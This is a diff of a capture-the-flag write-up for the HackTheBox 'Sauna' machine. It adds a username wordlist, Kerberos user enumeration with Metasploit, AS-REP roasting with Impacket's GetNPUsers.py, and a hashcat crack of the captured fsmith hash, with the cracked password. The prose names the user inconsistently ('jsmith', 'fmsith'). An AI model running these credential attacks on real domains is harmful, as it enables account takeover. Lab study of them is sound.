@@ -192,13 +192,35 @@ dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
 ```
 Hmm... not much to go off, just one potential user named Hugo Smith (though no Windows username to go with it.)
 
+```
+hugos
+hugo.smith
+hsmith
+stevenk
+steven.kerb
+skerb
+shaunc
+shaun.coins
+scoins
+hugob
+hugo.bear
+hbear
+bowiet
+bowie.taylor
+btaylor
+sofied
+sofie.driver
+sdriver
+ferguss
+fergus.smith
+fsmith
+```
+One potential username from ldapsearch that was not on the website, so I added it as well.
 
 ## Road to User
 ### Finding user creds
-Finding user credentials was pretty fast and straightforward for this machine.
+Finding user credentials was pretty fast and straightforward for this machine, despite not having a lot of information to go on. I used my list of potential usernames and used the Metasploit module `auxiliary/gather/kerberos_enumusers` to check if any of these usernames were valid, and if they had Kerberos pre-authentication turned off. This setting is a security feature of Kerberos which gives protection against password-guessing brute force attacks.  
 
-in msfconsole: msf5 auxiliary(gather/kerberos_enumusers)
-	-enumerates valid users against kerberos from a list; checks for "pre-auth required"
 ```
 msf5 auxiliary(gather/kerberos_enumusers) > run
 [*] Running module against 10.10.10.175
@@ -209,13 +231,24 @@ msf5 auxiliary(gather/kerberos_enumusers) > run
 [*] 10.10.10.175:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
 [+] 10.10.10.175:88 - User: "hsmith" is present
 ```
-fsmith crashes this scan for some reason...
-
+After running this scan, I only got back one hit for a valid username `hsmith`.  I now at least had a valid username and the potential business format for other usernames.  The scan would crash Metasploit for some reason when it got to the name `fsmith` (*I tried this multiple times with and without that name to be sure*). I kept this username on the potentially valid list just in case. 
 ```
 zweilos@kalimaa:~/impacket/examples$ python3 GetNPUsers.py -outputfile sauna.hash -format hashcat -usersfile /home/zweilos/htb/sauna/users -no-pass -dc-ip 10.10.10.175 EGOTISTICALBANK/hsmith
 
+[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+```
+Since `fsmith` crashed Metasploit I was hoping that it was because there was something in the output that it didn't understand.  I decided to use another script that would give the same information to me, but would also dump the Kerberos hashes for any users who did not require the pre-authentication check.  I used the `GetNPUsers.py` tool from the Impacket python examples to try to get the `krb5asrep` hashes using the valid username Metasploit had gotten from the domain controller. In order to pull these hashes you need a valid username in the format `DOMAINNAME/username`.  Luckily I had the domain name from my early enumeration.  I set my output to be saved in hashcat format so I could use that tool to try to quickly crack the hash.  
+
+At first I thought that I was just getting back the same results as the Metasploit module, until I counted the number of names.  I realized that their was one unnaccounted for.  I looked in the output directory and saw my output file `sauna.hash` which contained:
+```
 $krb5asrep$23$fsmith@EGOTISTICALBANK:30279f364d10168e316be0713c91cb16$422f07d5f637adc6c396d1999bca49283f7f24c0257ead111b9adf94c623a7247e8e7575905e1ed3978dbce3a7a2b2d293d7339bc80dd2df4154ac019f614809aed59536842505f726e48a0119a18c3bc66d31cfe424269592b558e2ffdd616e36b1f8fccb6e4e16c8a0d9c1b9b668db776d4c46a1fa2d5cd00e2a00c59f218425690286f2bb95b4336ae1edea8def1d3da3ebd1c496da4664c1ce6299b0370dd87219b23243ce47fd1272dd5e1f084305cf1732ce7c5084727a9199935b2bcb3198c17e3d84d339611150501ccf17ae4f16e4784172da981623ac96f14bfbf17cf4afb8df652c089e363f2f07562703db74106bd22179dd37
 ```
+It contained the Kerberos hash for the user `jsmith`!  I had been right in my hunch that it was still a valid username despite the odd behavior earlier.  I am not sure why `GetNPUsers.py` doesn't inform you when it finds a valid user and gets the hash, so pay attention to your output files! Next 
 ```
 zweilos@kalimaa:~/htb/sauna$ hashcat -m 18200 -a 0 sauna.hash ~/rockyou.txt --force
 
@@ -247,7 +280,7 @@ Candidates.#1....: Tiona172 -> Thelink
 Started: Tue Jun  2 16:13:42 2020
 Stopped: Tue Jun  2 16:15:18 2020
 ```
-
+Including the time spent building the dictionary file and getting everything loaded, this hash took less than two minutes to be cracked. The password for `fmsith` was apparently `Thestrokes23`.  
 ### User.txt
 
 ```
